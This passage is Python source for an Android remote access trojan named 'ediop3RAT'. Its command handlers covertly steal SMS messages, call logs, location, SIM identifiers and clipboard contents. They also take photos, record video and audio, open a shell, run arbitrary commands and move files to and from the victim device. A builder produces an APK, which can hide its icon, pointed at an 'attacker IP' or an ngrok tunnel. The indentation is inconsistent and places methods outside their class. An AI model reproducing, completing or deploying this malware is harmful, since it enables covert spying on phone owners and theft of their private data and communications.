            parts = command.split()
            cmd = parts[0]
            
            if cmd == "deviceInfo":
                return self.get_device_info()
            elif cmd == "getIP":
                return self.get_ip_address()
            elif cmd == "shell":
                return self.execute_shell()
            elif cmd == "getLocation":
                return self.get_location()
            elif cmd == "getSMS":
                if len(parts) > 1:
                    return self.get_sms(parts[1])
                return "Usage: getSMS [inbox|sent]"
            elif cmd == "getCallLogs":
                return self.get_call_logs()
            elif cmd == "camList":
                return self.list_cameras()
            elif cmd == "takepic":
                if len(parts) > 1:
                    return self.take_picture(parts[1])
                return "Usage: takepic [cameraID]"
            elif cmd == "startVideo":
                if len(parts) > 1:
                    return self.start_video(parts[1])
                return "Usage: startVideo [cameraID]"
            elif cmd == "stopVideo":
                return self.stop_video()
            elif cmd == "startAudio":
                return self.start_audio()
            elif cmd == "stopAudio":
                return self.stop_audio()
            elif cmd == "vibrate":
                if len(parts) > 1:
                    return self.vibrate(parts[1])
                return "Usage: vibrate [number_of_times]"
            elif cmd == "getSimDetails":
                return self.get_sim_details()
            elif cmd == "getClipData":
                return self.get_clipboard_data()
            elif cmd == "getMACAddress":
                return self.get_mac_address()
            elif cmd == "clear":
                return "\033c"
            elif cmd == "get":
                if len(parts) > 1:
                    return self.download_file(parts[1])
                return "Usage: get [full_file_path]"
            elif cmd == "put":
                if len(parts) > 1:
                    return self.upload_file(parts[1])
                return "Usage: put [filename]"
            else:
                return self.execute_command(command)
                
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_device_info(self):
        return f"""Manufacturer: {os.popen("getprop ro.product.manufacturer").read().strip()}
Model: {os.popen("getprop ro.product.model").read().strip()}
Android Version: {os.popen("getprop ro.build.version.release").read().strip()}
SDK: {os.popen("getprop ro.build.version.sdk").read().strip()}
"""
    
def get_ip_address(self):
    try:
        import fcntl, socket, struct
        interfaces = ["wlan0", "eth0", "lo", "rmnet0"]
        result = []
        
        for ifname in interfaces:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ip = socket.inet_ntoa(fcntl.ioctl(
                    s.fileno(),
                    0x8915,
                    struct.pack('256s', ifname[:15].encode())
                )[20:24])
                result.append(f"{ifname}: {ip}")
            except:
                continue
        
        if not result:
            result.append(os.popen("ip addr show | grep 'inet ' | awk '{print $2}'").read().strip())
        
        return "\n".join(result) if result else "No IP addresses found"
    except Exception as e:
        return f"Error getting IP: {str(e)}"

def execute_shell(self, command=None):
    try:
        if not command:
            import pty
            import select
            import termios
            import tty
            
            oldtty = termios.tcgetattr(sys.stdin)
            try:
                tty.setraw(sys.stdin.fileno())
                tty.setcbreak(sys.stdin.fileno())
                pty.spawn("/system/bin/sh")
            finally:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)
            return ""
        else:
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            output, error = proc.communicate()
            return output.decode() + error.decode()
    except Exception as e:
        return f"Shell error: {str(e)}"

def get_location(self):
    try:
        from android import Android
        droid = Android()
        
        droid.startLocating()
        time.sleep(5)  
        
        location = droid.getLastKnownLocation().result
        if not location:
            return "Location not available"
            
        providers = ['gps', 'network', 'passive']
        best = None
        
        for provider in providers:
            if provider in location:
                if not best or location[provider]['accuracy'] < best['accuracy']:
                    best = location[provider]
        
        if best:
            return (f"Latitude: {best['latitude']}\n"
                    f"Longitude: {best['longitude']}\n"
                    f"Altitude: {best.get('altitude', 'N/A')}\n"
                    f"Accuracy: {best['accuracy']} meters\n"
                    f"Provider: {best['provider']}\n"
                    f"Time: {datetime.fromtimestamp(best['time']/1000)}")
        return "No location data available"
    except Exception as e:
        return f"Location error: {str(e)}"

def get_sms(self, box_type="inbox"):
    try:
        from android.provider import Telephony
        from urllib.parse import quote
        
        content = ""
        if box_type.lower() == "inbox":
            uri = Telephony.Sms.Inbox.CONTENT_URI
        elif box_type.lower() == "sent":
            uri = Telephony.Sms.Sent.CONTENT_URI
        else:
            return "Invalid box type. Use 'inbox' or 'sent'"
        
        cursor = self.getContentResolver().query(
            uri,
            None, None, None, None
        )
        
        if not cursor:
            return "No SMS permissions or no messages"
            
        while cursor.moveToNext():
            content += (
                f"From: {cursor.getString(cursor.getColumnIndex('address'))}\n"
                f"Body: {cursor.getString(cursor.getColumnIndex('body'))}\n"
                f"Date: {datetime.fromtimestamp(cursor.getLong(cursor.getColumnIndex('date'))/1000)}\n"
                f"-----\n"
            )
        
        cursor.close()
        return content if content else f"No {box_type} messages found"
    except Exception as e:
        return f"SMS error: {str(e)}"

def get_call_logs(self):
    try:
        from android.provider import CallLog
        content = ""
        
        cursor = self.getContentResolver().query(
            CallLog.Calls.CONTENT_URI,
            None, None, None,
            CallLog.Calls.DATE + " DESC"
        )
        
        if not cursor:
            return "No call log permissions or empty history"
            
        while cursor.moveToNext():
            call_type = ""
            if int(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.INCOMING_TYPE:
                call_type = "INCOMING"
            elif int(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.OUTGOING_TYPE:
                call_type = "OUTGOING"
            else:
                call_type = "MISSED"
            
            content += (
                f"Number: {cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))}\n"
                f"Type: {call_type}\n"
                f"Date: {datetime.fromtimestamp(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))/1000)}\n"
                f"Duration: {cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))} seconds\n"
                f"-----\n"
            )
        
        cursor.close()
        return content if content else "No call logs found"
    except Exception as e:
        return f"Call log error: {str(e)}"

def list_cameras(self):
    try:
        from android.hardware import Camera
        camera_count = Camera.getNumberOfCameras()
        result = []
        
        for i in range(camera_count):
            info = Camera.CameraInfo()
            Camera.getCameraInfo(i, info)
            facing = "Front" if info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT else "Back"
            result.append(f"Camera {i}: {facing} facing, {info.orientation}° orientation")
        
        return "\n".join(result) if result else "No cameras found"
    except Exception as e:
        return f"Camera error: {str(e)}"

def take_picture(self, camera_id=0):
    try:
        from android.hardware import Camera
        import base64
        
        camera = Camera.open(int(camera_id))
        
        params = camera.getParameters()
        params.setPreviewSize(640, 480)
        camera.setParameters(params)
        
        temp_file = os.path.join(self.getCacheDir(), "temp_pic.jpg")
        
        def callback(image_data, camera):
            with open(temp_file, "wb") as f:
                f.write(image_data)
            camera.release()
        
        camera.take_picture(None, None, callback)
        
        time.sleep(2)
        
        with open(temp_file, "rb") as f:
            img_data = base64.b64encode(f.read()).decode()
        
        os.remove(temp_file)
        return f"IMAGE_DATA:{img_data}"
    except Exception as e:
        return f"Picture error: {str(e)}"

def start_video(self, camera_id=0):
    try:
        from android.hardware import Camera
        import threading
        
        if hasattr(self, 'camera_recording') and self.camera_recording:
            return "Already recording"
        
        self.camera_recording = True
        self.video_temp_file = os.path.join(self.getCacheDir(), "temp_video.mp4")
        
        camera = Camera.open(int(camera_id))
        self.recording_camera = camera
        
        params = camera.getParameters()
        params.setPreviewSize(640, 480)
        camera.setParameters(params)
        
        from android.media import MediaRecorder
        recorder = MediaRecorder()
        self.media_recorder = recorder
        
        recorder.setCamera(camera)
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
        recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA)
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        recorder.setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP)
        recorder.setOutputFile(self.video_temp_file)
        recorder.setPreviewDisplay(camera.getPreviewDisplay())
        recorder.prepare()
        recorder.start()
        
        def recording_monitor():
            while self.camera_recording:
                time.sleep(0.1)
            recorder.stop()
            recorder.release()
            camera.release()
        
        threading.Thread(target=recording_monitor).start()
        
        return f"Started recording from camera {camera_id}"
    except Exception as e:
        return f"Video start error: {str(e)}"

def stop_video(self):
    try:
        if not hasattr(self, 'camera_recording') or not self.camera_recording:
            return "Not currently recording"
        
        self.camera_recording = False
        time.sleep(1)
        
        with open(self.video_temp_file, "rb") as f:
            video_data = base64.b64encode(f.read()).decode()
        
        os.remove(self.video_temp_file)
        return f"VIDEO_DATA:{video_data}"
    except Exception as e:
        return f"Video stop error: {str(e)}"

def start_audio(self):
    try:
        from android.media import MediaRecorder
        
        if hasattr(self, 'audio_recording') and self.audio_recording:
            return "Already recording audio"
        
        self.audio_recording = True
        self.audio_temp_file = os.path.join(self.getCacheDir(), "temp_audio.3gp")
        
        recorder = MediaRecorder()
        self.audio_recorder = recorder
        
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        recorder.setOutputFile(self.audio_temp_file)
        recorder.prepare()
        recorder.start()
        
        return "Started audio recording"
    except Exception as e:
        return f"Audio start error: {str(e)}"

def stop_audio(self):
    try:
        if not hasattr(self, 'audio_recording') or not self.audio_recording:
            return "Not currently recording audio"
        
        self.audio_recording = False
        self.audio_recorder.stop()
        self.audio_recorder.release()
        
        with open(self.audio_temp_file, "rb") as f:
            audio_data = base64.b64encode(f.read()).decode()
        
        os.remove(self.audio_temp_file)
        return f"AUDIO_DATA:{audio_data}"
    except Exception as e:
        return f"Audio stop error: {str(e)}"

def vibrate(self, times=1):
    try:
        from android import Android
        droid = Android()
        
        for _ in range(int(times)):
            droid.vibrate(500)
            time.sleep(1)
        
        return f"Vibrated {times} times"
    except Exception as e:
        return f"Vibration error: {str(e)}"

def get_sim_details(self):
    try:
        from android.telephony import TelephonyManager
        tm = self.getSystemService("phone")
        
        result = []
        for sim in range(tm.getSimCount()):
            info = (
                f"SIM {sim+1}:\n"
                f"  IMSI: {tm.getSubscriberId(sim)}\n"
                f"  ICCID: {tm.getSimSerialNumber(sim)}\n"
                f"  Operator: {tm.getSimOperatorName(sim)}\n"
                f"  Country: {tm.getSimCountryIso(sim)}\n"
                f"  Network: {tm.getNetworkOperatorName(sim)}\n"
                f"  Phone: {tm.getLine1Number(sim)}"
            )
            result.append(info)
        
        return "\n\n".join(result) if result else "No SIM cards found"
    except Exception as e:
        return f"SIM error: {str(e)}"

def get_clipboard_data(self):
    try:
        from android import ClipboardManager
        from android.content import Context
        
        cm = self.getSystemService(Context.CLIPBOARD_SERVICE)
        if not cm.hasPrimaryClip():
            return "Clipboard empty"
        
        item = cm.getPrimaryClip().getItemAt(0)
        return item.getText().toString()
    except Exception as e:
        return f"Clipboard error: {str(e)}"

def get_mac_address(self):
    try:
        interfaces = ["wlan0", "eth0"]
        result = []
        
        for iface in interfaces:
            try:
                with open(f"/sys/class/net/{iface}/address") as f:
                    mac = f.read().strip()
                    if mac:
                        result.append(f"{iface}: {mac}")
            except:
                continue
        
        return "\n".join(result) if result else "No MAC addresses found"
    except Exception as e:
        return f"MAC error: {str(e)}"

def download_file(self, remote_path):
    try:
        if not os.path.exists(remote_path):
            return f"File not found: {remote_path}"
            
        if os.path.getsize(remote_path) > 15 * 1024 * 1024:
            return "File too large (max 15MB)"
            
        with open(remote_path, "rb") as f:
            file_data = base64.b64encode(f.read()).decode()
            
        file_name = os.path.basename(remote_path)
        return f"FILE_DOWNLOAD:{file_name}:{file_data}"
    except Exception as e:
        return f"Download error: {str(e)}"
        
def upload_file(self, file_data, remote_path=None):
    try:
        if ":" not in file_data:
            return "Invalid file format. Use 'filename:base64data'"
            
        file_name, b64_data = file_data.split(":", 1)
        file_bytes = base64.b64decode(b64_data)
        
        if not remote_path:
            remote_path = os.path.join(
                self.get_external_storage_dir(),
                "Download",
                file_name
            )
        
        chunk_size = 8192
        with open(remote_path, "wb") as f:
            for i in range(0, len(file_bytes), chunk_size):
                f.write(file_bytes[i:i+chunk_size])
        
        now = time.time()
        os.utime(remote_path, (now, now))
        
        return f"File uploaded successfully to: {remote_path}"
    
    except Exception as e:
        return f"Upload failed: {str(e)}"

def get_external_storage_dir(self):
    try:
        for path in [
            "/storage/emulated/0/Download",
            "/sdcard/Download",
            os.getenv("EXTERNAL_STORAGE")
        ]:
            if path and os.path.exists(path):
                return path
        
        return self.getExternalFilesDir(None).getAbsolutePath()
    except:
        return "/data/local/tmp"

    def execute_command(self, command):
        try:
            return os.popen(command).read()
        except Exception as e:
            return str(e)
    
    def start_listener(self, ip, port):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((ip, port))
            server.listen(5)
            
            print(f"[*] Listening on {ip}:{port}")
            
            while self.running:
                client_socket, address = server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address)
                )
                client_thread.start()
                
        except Exception as e:
            print(f"[-] Listener error: {str(e)}")
        finally:
            server.close()

def main():
    parser = argparse.ArgumentParser(description="ediop3RAT - Android Remote Administration Tool")
    parser.add_argument("--build", action="store_true", help="Build the Android APK")
    parser.add_argument("--ngrok", action="store_true", help="Use ngrok tunnel")
    parser.add_argument("--shell", action="store_true", help="Start interactive shell")
    parser.add_argument("-i", "--ip", help="Attacker IP address")
    parser.add_argument("-p", "--port", type=int, default=8000, help="Attacker port number")
    parser.add_argument("-o", "--output", default="karma.apk", help="Output APK filename")
    parser.add_argument("-icon", "--icon", action="store_true", help="Make icon visible")
    args = parser.parse_args()
    
    rat = AndroidRAT()
    
    if args.build:
        if args.ngrok:
            public_url = rat.start_ngrok(args.port)
            if public_url:
                rat.build_apk(public_url.split(":")[1].strip("//"), args.port, args.output, args.icon)
                rat.stop_ngrok()
        else:
            if not args.ip:
                print("[-] IP address is required when not using ngrok")
                return
            rat.build_apk(args.ip, args.port, args.output, args.icon)
    elif args.shell:
        if not args.ip:
            print("[-] IP address is required for shell mode")
            return
        rat.start_listener(args.ip, args.port)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
